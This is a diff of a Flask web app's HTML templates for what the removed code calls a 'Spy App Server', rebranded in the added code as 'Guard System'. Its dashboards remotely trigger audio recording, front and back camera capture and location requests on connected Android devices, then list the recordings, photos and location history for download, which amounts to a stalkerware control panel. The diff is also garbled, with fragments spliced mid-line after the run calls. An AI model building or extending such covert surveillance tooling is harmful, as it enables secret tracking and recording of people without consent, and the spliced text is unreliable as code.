+            </div>
+            
+            <div class="devices-grid" id="devicesGrid">
+                {% for device in devices %}
+                <div class="device-card {{ 'online' if device.status == 'online' else 'offline' }}">
+                    <div class="device-header">
+                        <div>
+                            <div class="device-name">{{ device.name }}</div>
+                            <div class="device-model">{{ device.model }}</div>
+                        </div>
+                        <div class="device-status {{ 'status-online' if device.status == 'online' else 'status-offline' }}">
+                            {{ device.status }}
+                        </div>
+                    </div>
+                    
+                    <div class="device-info">
+                        <div class="device-info-item">
+                            <span class="info-label">Device ID:</span>
+                            <span class="info-value">{{ device.id[:8] }}...</span>
+                        </div>
+                        <div class="device-info-item">
+                            <span class="info-label">Last Seen:</span>
+                            <span class="info-value" id="lastSeen{{ device.id }}">{{ device.last_seen|int|string|truncate(10, True, '') }}</span>
+                        </div>
+                    </div>
+                    
+                    <div class="device-actions">
+                        <a href="/device/{{ device.id }}" class="btn-control btn-manage">🎮 Manage Device</a>
+                    </div>
                 </div>
-            {% endfor %}
-        </div>
-        {% endif %}
-        
-        <!-- Photos Section -->
-        {% if photos %}
-        <div class="section">
-            <h2>Recent Photos ({{ photos|length }})</h2>
-            <div class="file-grid">
-                {% for photo in photos %}
-                    <div class="file-card">
-                        <img src="/files/{{ photo.name }}" alt="Photo" onerror="this.style.display='none'">
-                        <div class="file-info">
-                            {{ photo.name }}<br>
-                            {{ (photo.size / 1024)|round|int }} KB<br>
-                            {{ photo.modified|int|ctime }}
-                        </div>
-                        <a href="/files/{{ photo.name }}" class="file-link" download>Download</a>
-                    </div>
                 {% endfor %}
+                
+                {% if devices|length == 0 %}
+                <div class="empty-state">
+                    <h3>📱 No Devices Connected</h3>
+                    <p>Install the Guard System app on your Android devices to see them here.</p>
+                    <p>Devices will automatically appear when they connect to the server.</p>
+                </div>
+                {% endif %}
             </div>
         </div>
-        {% endif %}
-        
-        <!-- Recordings Section -->
-        {% if files %}
-        <div class="section">
-            <h2>Audio Recordings ({{ files|length }})</h2>
-            <div class="file-grid">
-                {% for file in files %}
-                    <div class="file-card">
-                        <audio controls>
-                            <source src="/files/{{ file.name }}" type="audio/mp4">
-                            Your browser does not support the audio element.
-                        </audio>
-                        <div class="file-info">
-                            {{ file.name }}<br>
-                            {{ (file.size / 1024)|round|int }} KB<br>
-                            {{ file.modified|int|ctime }}
-                        </div>
-                        <a href="/files/{{ file.name }}" class="file-link" download>Download</a>
-                    </div>
-                {% endfor %}
-            </div>
-        </div>
-        {% endif %}
-        
-        <!-- Location Section -->
-        {% if location_files %}
-        <div class="section">
-            <h2>Location History ({{ location_files|length }})</h2>
-            <div style="display: grid; gap: 10px;">
-                {% for location in location_files %}
-                    <div style="padding: 10px; border: 1px solid #ddd; border-radius: 5px;">
-                        <strong>{{ location.name }}</strong><br>
-                        {{ (location.size / 1024)|round|int }} KB - {{ location.modified|int|ctime }}<br>
-                        <a href="/files/{{ location.name }}" target="_blank">View Location Details</a>
-                    </div>
-                {% endfor %}
-            </div>
-        </div>
-        {% endif %}
-        
-        <!-- No Files Message -->
-        {% if not files and not photos and not location_files %}
-        <div class="section">
-            <h2>No Files Yet</h2>
-            <p>No recordings, photos, or location data has been uploaded from this device yet.</p>
-            <p>Use the controls above to capture data from the device.</p>
-        </div>
-        {% endif %}
     </div>
 
     <script>
-        function showStatus(message, isError = false) {
-            const statusEl = document.getElementById('control-status');
-            statusEl.innerHTML = message;
-            statusEl.style.color = isError ? 'red' : 'green';
-            setTimeout(() => statusEl.innerHTML = '', 5000);
+        function refreshDevices() {
+            location.reload();
         }
         
-        async function startRecording() {
-            try {
-                showStatus('Sending recording signal...');
-                const response = await fetch('/device/{{ device_id }}/start-recording', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ record_time: 15 })
-                });
-                
-                const data = await response.json();
-                if (data.ok) {
-                    showStatus('✅ Recording signal sent! Device should start recording...');
-                } else {
-                    showStatus('❌ Failed to send signal: ' + data.error, true);
-                }
-            } catch (error) {
-                showStatus('❌ Error: ' + error.message, true);
-            }
-        }
+        // Format last seen timestamps
+        document.addEventListener('DOMContentLoaded', function() {
+            // This would typically format the timestamps to relative time
+            // For now, we'll just reload the page to get fresh data
+        });
         
-        async function startCamera(cameraType) {
-            try {
-                showStatus(`Starting ${cameraType} camera...`);
-                const response = await fetch('/device/{{ device_id }}/start-camera-signal', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ camera_type: cameraType })
-                });
-                
-                const data = await response.json();
-                if (data.ok) {
-                    showStatus(`✅ ${cameraType} camera signal sent!`);
-                } else {
-                    showStatus('❌ Failed to start camera: ' + data.error, true);
-                }
-            } catch (error) {
-                showStatus('❌ Error: ' + error.message, true);
-            }
-        }
-        
-        async function startLocation() {
-            try {
-                showStatus('Requesting location...');
-                const response = await fetch('/device/{{ device_id }}/start-location-signal', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' }
-                });
-                
-                const data = await response.json();
-                if (data.ok) {
-                    showStatus('✅ Location request sent!');
-                } else {
-                    showStatus('❌ Failed to request location: ' + data.error, true);
-                }
-            } catch (error) {
-                showStatus('❌ Error: ' + error.message, true);
-            }
-        }
-        
-        async function refreshFiles() {
-            try {
-                showStatus('Refreshing files...');
-                const response = await fetch('/device/{{ device_id }}/refresh-files', {
-                    method: 'POST'
-                });
-                
-                const data = await response.json();
-                if (data.ok) {
-                    showStatus('✅ Files refreshed!');
-                    setTimeout(() => location.reload(), 1000);
-                } else {
-                    showStatus('❌ Failed to refresh files', true);
-                }
-            } catch (error) {
-                showStatus('❌ Error: ' + error.message, true);
-            }
-        }
-        
-        // Auto-refresh page every 30 seconds to check for new files
-        setTimeout(() => location.reload(), 30000);
+        // Auto-refresh every 30 seconds
+        setInterval(refreshDevices, 30000);
     </script>
 </body>
 </html>
 """
 
-# ✅ DEBUGGING ROUTES
-
-@app.route('/debug-filesystem')
-def debug_filesystem():
-    """Debug route to check file system status"""
-    if not session.get('logged_in'):
-        return redirect(url_for('login'))
-    
-    upload_dir = app.config['UPLOAD_FOLDER']
-    device_dir = app.config['DEVICE_FOLDER']
-    notification_dir = app.config['NOTIFICATION_FOLDER']
-    
-    result = {
-        'upload_directory': {
-            'path': upload_dir,
-            'exists': os.path.exists(upload_dir),
-            'files': []
-        },
-        'device_directory': {
-            'path': device_dir,
-            'exists': os.path.exists(device_dir),
-            'files': []
-        },
-        'notification_directory': {
-            'path': notification_dir,
-            'exists': os.path.exists(notification_dir),
-            'files': []
+# DEVICE_DASHBOARD_HTML template - Individual device control panel
+DEVICE_DASHBOARD_HTML = """
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚀 Guard System - {{ device.name }}</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-    }
-    
-    # Check upload directory
-    if os.path.exists(upload_dir):
-        try:
-            files = os.listdir(upload_dir)
-            for filename in files:
-                filepath = os.path.join(upload_dir, filename)
-                result['upload_directory']['files'].append({
-                    'name': filename,
-                    'size': os.path.getsize(filepath),
-                    'modified': time.ctime(os.path.getmtime(filepath))
-                })
-        except Exception as e:
-            result['upload_directory']['error'] = str(e)
-    
-    # Check device directory  
-    if os.path.exists(device_dir):
-        try:
-            files = os.listdir(device_dir)
-            for filename in files:
-                filepath = os.path.join(device_dir, filename)
-                result['device_directory']['files'].append({
-                    'name': filename,
-                    'size': os.path.getsize(filepath),
-                    'modified': time.ctime(os.path.getmtime(filepath))
-                })
-        except Exception as e:
-            result['device_directory']['error'] = str(e)
-    
-    return jsonify(result)
-
-@app.route('/device/<device_id>/refresh-files', methods=['POST'])
-def refresh_device_files(device_id):
-    """Manually refresh files for a device"""
-    if not session.get('logged_in'):
-        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
-    
-    try:
-        # This will trigger the file scanning logic
-        return jsonify({'ok': True, 'message': 'Files refreshed successfully'})
-    except Exception as e:
-        return jsonify({'ok': False, 'error': str(e)}), 500
-
-# ✅ RUN THE APPLICATION
-
-if __name__ == '__main__':
-    print("🚀 Starting Spy App Server...")
-    print(f"📁 Upload folder: {app.config['UPLOAD_FOLDER']}")
-    print(f"📁 Device folder: {app.config['DEVICE_FOLDER']}")
-    print(f"📁 Notification folder: {app.config['NOTIFICATION_FOLDER']}")
-    
-    # Ensure all directories exist
-    os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
-    os.makedirs(app.config['DEVICE_FOLDER'], exist_ok=True)
-    os.makedirs(app.config['NOTIFICATION_FOLDER'], exist_ok=True)
-    
-    app.run(host='0.0.0.0', port=5000, debug=True)m: 12px;
+        
+        body {
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #2d2d2d 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header Styles */
+        header {
+            background: rgba(25, 25, 25, 0.95);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 25px 30px;
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+        }
+        
+        .header-left h1 {
+            color: #00b7ff;
+            font-size: 2.2rem;
+            font-weight: 700;
+            text-shadow: 0 0 20px rgba(0, 183, 255, 0.5);
+            margin-bottom: 5px;
+        }
+        
+        .header-left p {
+            color: #888;
+            font-size: 1rem;
+        }
+        
+        .device-info {
+            margin-top: 10px;
+            font-size: 0.9rem;
+            color: #ccc;
+        }
+        
+        .header-right {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+        
+        /* Button Styles */
+        .btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .btn-logout {
+            background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
+            color: white;
+        }
+        
+        .btn-back {
+            background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
+            color: white;
+        }
+        
+        .btn-recorder {
+            background: linear-gradient(135deg, #00b7ff 0%, #0099cc 100%);
+            color: white;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.4);
+        }
+        
+        /* Control Sections */
+        .control-section {
+            background: rgba(25, 25, 25, 0.95);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 25px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+        }
+        
+        .section-title {
+            color: #00b7ff;
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 2px solid rgba(0, 183, 255, 0.3);
+            padding-bottom: 12px;
         }
         
         /* Control Groups */
@@ -1484,7 +1240,7 @@ if __name__ == '__main__':
         
         .control-group label {
             display: block;
-            color: var(--primary);
+            color: #00b7ff;
             margin-bottom: 8px;
             font-weight: 600;
             font-size: 0.9rem;
@@ -1495,8 +1251,8 @@ if __name__ == '__main__':
         .control-group input {
             background: rgba(255, 255, 255, 0.05);
             border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            color: var(--light);
+            border-radius: 8px;
+            color: #fff;
             padding: 12px 15px;
             font-size: 1rem;
             width: 120px;
@@ -1505,9 +1261,8 @@ if __name__ == '__main__':
         
         .control-group input:focus {
             outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 20px rgba(99, 102, 241, 0.3);
-            background: rgba(255, 255, 255, 0.1);
+            border-color: #00b7ff;
+            box-shadow: 0 0 20px rgba(0, 183, 255, 0.3);
         }
         
         /* Control Buttons */
@@ -1529,37 +1284,37 @@ if __name__ == '__main__':
             display: inline-flex;
             align-items: center;
             gap: 8px;
-            color: white;
         }
         
         .btn-start {
-            background: linear-gradient(135deg, var(--success) 0%, #059669 100%);
+            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
+            color: white;
         }
         
         .btn-stop {
-            background: linear-gradient(135deg, var(--danger) 0%, #dc2626 100%);
+            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
+            color: white;
         }
         
         .btn-camera-front {
-            background: linear-gradient(135deg, var(--info) 0%, #2563eb 100%);
+            background: linear-gradient(135deg, #17a2b8 0%, #138496 100%);
+            color: white;
         }
         
         .btn-camera-back {
-            background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);
+            background: linear-gradient(135deg, #6f42c1 0%, #5a2d91 100%);
+            color: white;
         }
         
         .btn-location {
-            background: linear-gradient(135deg, var(--warning) 0%, #d97706 100%);
-        }
-        
-        .btn-notification {
-            background: linear-gradient(135deg, #ec4899 0%, #db2777 100%);
+            background: linear-gradient(135deg, #ff6b35 0%, #e55627 100%);
+            color: white;
         }
         
         /* Status Indicators */
         .signal-status {
             padding: 10px 15px;
-            border-radius: 10px;
+            border-radius: 8px;
             font-weight: 600;
             font-size: 0.9rem;
             text-transform: uppercase;
@@ -1570,15 +1325,15 @@ if __name__ == '__main__':
         }
         
         .status-active {
-            background: rgba(16, 185, 129, 0.2);
-            color: var(--success);
-            border: 1px solid rgba(16, 185, 129, 0.5);
+            background: rgba(40, 167, 69, 0.2);
+            color: #28a745;
+            border: 1px solid rgba(40, 167, 69, 0.5);
         }
         
         .status-inactive {
-            background: rgba(107, 114, 128, 0.2);
-            color: var(--gray);
-            border: 1px solid rgba(107, 114, 128, 0.5);
+            background: rgba(108, 117, 125, 0.2);
+            color: #6c757d;
+            border: 1px solid rgba(108, 117, 125, 0.5);
         }
         
         /* File Lists */
@@ -1590,7 +1345,7 @@ if __name__ == '__main__':
         }
         
         .file-card {
-            background: rgba(55, 65, 81, 0.6);
+            background: rgba(40, 40, 40, 0.8);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 12px;
             padding: 20px;
@@ -1599,22 +1354,21 @@ if __name__ == '__main__':
         
         .file-card:hover {
             transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(99, 102, 241, 0.3);
-            border-color: var(--primary);
+            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.3);
+            border-color: #00b7ff;
         }
         
         .file-name {
-            color: var(--primary);
+            color: #00b7ff;
             font-weight: 600;
             margin-bottom: 8px;
             word-break: break-all;
-            font-size: 0.9rem;
         }
         
         .file-info {
             display: flex;
             justify-content: space-between;
-            color: var(--gray);
+            color: #888;
             font-size: 0.85rem;
             margin-bottom: 12px;
         }
@@ -1628,7 +1382,7 @@ if __name__ == '__main__':
             flex: 1;
             padding: 8px 12px;
             border: none;
-            border-radius: 8px;
+            border-radius: 6px;
             font-size: 0.8rem;
             font-weight: 600;
             cursor: pointer;
@@ -1639,11 +1393,11 @@ if __name__ == '__main__':
         }
         
         .btn-download {
-            background: linear-gradient(135deg, var(--success) 0%, #059669 100%);
+            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
         }
         
         .btn-delete {
-            background: linear-gradient(135deg, var(--danger) 0%, #dc2626 100%);
+            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
         }
         
         /* Photos Grid */
@@ -1655,7 +1409,7 @@ if __name__ == '__main__':
         }
         
         .photo-card {
-            background: rgba(55, 65, 81, 0.6);
+            background: rgba(40, 40, 40, 0.8);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 12px;
             overflow: hidden;
@@ -1664,15 +1418,15 @@ if __name__ == '__main__':
         
         .photo-card:hover {
             transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(99, 102, 241, 0.3);
-            border-color: var(--primary);
+            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.3);
+            border-color: #00b7ff;
         }
         
         .photo-img {
             width: 100%;
             height: 150px;
             object-fit: cover;
-            background: var(--dark);
+            background: #1a1a1a;
         }
         
         .photo-info {
@@ -1680,7 +1434,7 @@ if __name__ == '__main__':
         }
         
         .photo-name {
-            color: var(--primary);
+            color: #00b7ff;
             font-size: 0.85rem;
             font-weight: 600;
             margin-bottom: 5px;
@@ -1688,17 +1442,471 @@ if __name__ == '__main__':
         }
         
         .photo-size {
-            color: var(--gray);
+            color: #888;
             font-size: 0.75rem;
         }
         
-        /* Notifications List */
-        .notifications-list {
-            margin-top: 20px;
+        .empty-state {
+            text-align: center;
+            padding: 40px 20px;
+            color: #666;
         }
         
-        .notification-item {
-            background: rgba(55, 65, 81, 0.6);
+        .empty-state h4 {
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+            color: #888;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .controls {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            
+            .btn-control {
+                justify-content: center;
+            }
+            
+            .files-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header>
+            <div class="header-left">
+                <h1>🎮 {{ device.name }}</h1>
+                <p>Device Control Panel</p>
+                <div class="device-info">
+                    Model: {{ device.model }} | ID: {{ device_id }}
+                </div>
+            </div>
+            <div class="header-right">
+                <a href="/" class="btn btn-back">⬅️ Back to Devices</a>
+                <a href="/logout" class="btn btn-logout">🚪 Logout</a>
+            </div>
+        </header>
+
+        <!-- Recording Controls -->
+        <div class="control-section">
+            <div class="section-title">🎤 Audio Recording Controls</div>
+            
+            <div class="control-group">
+                <label for="recordTime">Recording Duration (seconds):</label>
+                <input type="number" id="recordTime" value="15" min="5" max="300">
+            </div>
+            
+            <div class="controls">
+                <button class="btn-control btn-start" onclick="startRecording()">
+                    🎤 Start Recording
+                </button>
+                <button class="btn-control btn-stop" onclick="stopRecording()">
+                    ⏹️ Stop Recording
+                </button>
+                <div class="signal-status status-inactive" id="recordingStatus">
+                    🔴 Recording: Inactive
+                </div>
+            </div>
+        </div>
+
+        <!-- Camera Controls -->
+        <div class="control-section">
+            <div class="section-title">📸 Camera Controls</div>
+            
+            <div class="controls">
+                <button class="btn-control btn-camera-front" onclick="captureCamera('front')">
+                    📱 Front Camera
+                </button>
+                <button class="btn-control btn-camera-back" onclick="captureCamera('back')">
+                    📷 Back Camera
+                </button>
+                <div class="signal-status status-inactive" id="cameraStatus">
+                    🔴 Camera: Inactive
+                </div>
+            </div>
+        </div>
+
+        <!-- Location Controls -->
+        <div class="control-section">
+            <div class="section-title">📍 Location Controls</div>
+            
+            <div class="controls">
+                <button class="btn-control btn-location" onclick="getLocation()">
+                    📍 Get Location
+                </button>
+                <div class="signal-status status-inactive" id="locationStatus">
+                    🔴 Location: Inactive
+                </div>
+            </div>
+        </div>
+
+        <!-- Recordings List -->
+        <div class="control-section">
+            <div class="section-title">🎵 Recent Recordings</div>
+            
+            {% if files %}
+            <div class="files-grid">
+                {% for file in files %}
+                <div class="file-card">
+                    <div class="file-name">{{ file.name }}</div>
+                    <div class="file-info">
+                        <span>Size: {{ (file.size / 1024 / 1024)|round(2) }} MB</span>
+                        <span>{{ file.modified|int|string|truncate(10, True, '') }}</span>
+                    </div>
+                    <div class="file-actions">
+                        <a href="/files/{{ file.name }}" class="btn-file btn-download" download>📥 Download</a>
+                        <button class="btn-file btn-delete" onclick="deleteFile('{{ file.name }}')">🗑️ Delete</button>
+                    </div>
+                </div>
+                {% endfor %}
+            </div>
+            {% else %}
+            <div class="empty-state">
+                <h4>📭 No Recordings Found</h4>
+                <p>Start recording to see files here</p>
+            </div>
+            {% endif %}
+        </div>
+
+        <!-- Photos List -->
+        <div class="control-section">
+            <div class="section-title">🖼️ Recent Photos</div>
+            
+            {% if photos %}
+            <div class="photos-grid">
+                {% for photo in photos %}
+                <div class="photo-card">
+                    <img src="/files/{{ photo.name }}" alt="{{ photo.name }}" class="photo-img" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjE1MCIgdmlld0JveD0iMCAwIDIwMCAxNTAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMTUwIiBmaWxsPSIjMUExQTFBIi8+CjxwYXRoIGQ9Ik03NSA1MEgxMjVNMTI1IDUwSDEyNS41TTEyNSA1MEwxMjUgNTAuNVpNNzUgNzVIMTI1TTc1IDEwMEgxMjUiIHN0cm9rZT0iIzMzMyIgc3Ryb2tlLXdpZHRoPSIyIi8+CjxjaXJjbGUgY3g9Ijc1IiBjeT0iMTAwIiByPSIxNSIgZmlsbD0iIzMzMyIvPgo8L3N2Zz4K'">
+                    <div class="photo-info">
+                        <div class="photo-name">{{ photo.name }}</div>
+                        <div class="photo-size">{{ (photo.size / 1024)|round(2) }} KB</div>
+                    </div>
+                </div>
+                {% endfor %}
+            </div>
+            {% else %}
+            <div class="empty-state">
+                <h4>📷 No Photos Found</h4>
+                <p>Capture photos using camera controls</p>
+            </div>
+            {% endif %}
+        </div>
+
+        <!-- Location Files -->
+        <div class="control-section">
+            <div class="section-title">🗺️ Location History</div>
+            
+            {% if location_files %}
+            <div class="files-grid">
+                {% for location in location_files %}
+                <div class="file-card">
+                    <div class="file-name">{{ location.name }}</div>
+                    <div class="file-info">
+                        <span>Size: {{ (location.size / 1024)|round(2) }} KB</span>
+                        <span>{{ location.modified|int|string|truncate(10, True, '') }}</span>
+                    </div>
+                    <div class="file-actions">
+                        <a href="/files/{{ location.name }}" class="btn-file btn-download" download>📥 Download</a>
+                        <button class="btn-file btn-delete" onclick="deleteFile('{{ location.name }}')">🗑️ Delete</button>
+                    </div>
+                </div>
+                {% endfor %}
+            </div>
+            {% else %}
+            <div class="empty-state">
+                <h4>🗺️ No Location Data</h4>
+                <p>Get location data using location controls</p>
+            </div>
+            {% endif %}
+        </div>
+    </div>
+
+    <script>
+        const deviceId = "{{ device_id }}";
+        
+        // Recording functions
+        async function startRecording() {
+            const recordTime = document.getElementById('recordTime').value || 15;
+            
+            try {
+                const response = await fetch(`/device/${deviceId}/start-recording`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ record_time: parseInt(recordTime) })
+                });
+                
+                const data = await response.json();
+                
+                if (data.ok) {
+                    updateStatus('recordingStatus', '🟢 Recording: Active', 'status-active');
+                    showNotification('Recording signal sent to device', 'success');
+                } else {
+                    showNotification('Failed to send recording signal: ' + data.error, 'error');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showNotification('Failed to send recording signal', 'error');
+            }
+        }
+        
+        function stopRecording() {
+            // For now, stopping is handled automatically after the recording duration
+            updateStatus('recordingStatus', '🔴 Recording: Inactive', 'status-inactive');
+            showNotification('Recording will stop automatically after duration', 'info');
+        }
+        
+        // Camera functions
+        async function captureCamera(cameraType) {
+            try {
+                const response = await fetch(`/device/${deviceId}/start-camera-signal`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ camera_type: cameraType })
+                });
+                
+                const data = await response.json();
+                
+                if (data.ok) {
+                    updateStatus('cameraStatus', `🟢 Camera: ${cameraType} Active`, 'status-active');
+                    showNotification(`${cameraType} camera signal sent to device`, 'success');
+                    
+                    // Reset status after 5 seconds
+                    setTimeout(() => {
+                        updateStatus('cameraStatus', '🔴 Camera: Inactive', 'status-inactive');
+                    }, 5000);
+                } else {
+                    showNotification('Failed to send camera signal: ' + data.error, 'error');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showNotification('Failed to send camera signal', 'error');
+            }
+        }
+        
+        // Location functions
+        async function getLocation() {
+            try {
+                const response = await fetch(`/device/${deviceId}/start-location-signal`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+                
+                const data = await response.json();
+                
+                if (data.ok) {
+                    updateStatus('locationStatus', '🟢 Location: Active', 'status-active');
+                    showNotification('Location signal sent to device', 'success');
+                    
+                    // Reset status after 5 seconds
+                    setTimeout(() => {
+                        updateStatus('locationStatus', '🔴 Location: Inactive', 'status-inactive');
+                    }, 5000);
+                } else {
+                    showNotification('Failed to send location signal: ' + data.error, 'error');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showNotification('Failed to send location signal', 'error');
+            }
+        }
+        
+        // Utility functions
+        function updateStatus(elementId, text, className) {
+            const element = document.getElementById(elementId);
+            element.textContent = text;
+            element.className = `signal-status ${className}`;
+        }
+        
+        function showNotification(message, type) {
+            // Simple notification - you can enhance this with a proper notification system
+            alert(`${type.toUpperCase()}: ${message}`);
+        }
+        
+        async function deleteFile(filename) {
+            if (confirm('Are you sure you want to delete this file?')) {
+                try {
+                    const response = await fetch(`/delete-file/${filename}`, {
+                        method: 'POST'
+                    });
+                    
+                    if (response.ok) {
+                        showNotification('File deleted successfully', 'success');
+                        location.reload();
+                    } else {
+                        showNotification('Failed to delete file', 'error');
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    showNotification('Failed to delete file', 'error');
+                }
+            }
+        }
+        
+        // Auto-refresh photos and location data every 10 seconds
+        setInterval(() => {
+            // You can implement auto-refresh for specific sections here
+        }, 10000);
+    </script>
+</body>
+</html>
+"""
+
+# LOGIN_HTML template (keep your existing login template)
+LOGIN_HTML = """
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚀 Guard System - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #2d2d2d 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        
+        .login-container {
+            background: rgba(25, 25, 25, 0.95);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+        }
+        
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .login-header h1 {
+            color: #00b7ff;
+            font-size: 2.5rem;
+            font-weight: 700;
+            text-shadow: 0 0 20px rgba(0, 183, 255, 0.5);
+            margin-bottom: 10px;
+        }
+        
+        .login-header p {
+            color: #888;
+            font-size: 1rem;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            color: #00b7ff;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            color: #fff;
+            padding: 15px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #00b7ff;
+            box-shadow: 0 0 20px rgba(0, 183, 255, 0.3);
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            background: linear-gradient(135deg, #00b7ff 0%, #0099cc 100%);
+            color: white;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.4);
+        }
+        
+        .error-message {
+            color: #ff4444;
+            text-align: center;
+            margin-top: 15px;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <h1>🚀 GUARD SYSTEM</h1>
+            <p>Secure Access Portal</p>
+        </div>
+        
+        <form method="POST">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            
+            <button type="submit" class="login-btn">🔐 Login</button>
+            
+            {% if error %}
+            <div class="error-message">{{ error }}</div>
+            {% endif %}
+        </form>
+    </div>
+</body>
+</html>
+"""
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=True)ckground: rgba(55, 65, 81, 0.6);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 12px;
             padding: 15px;
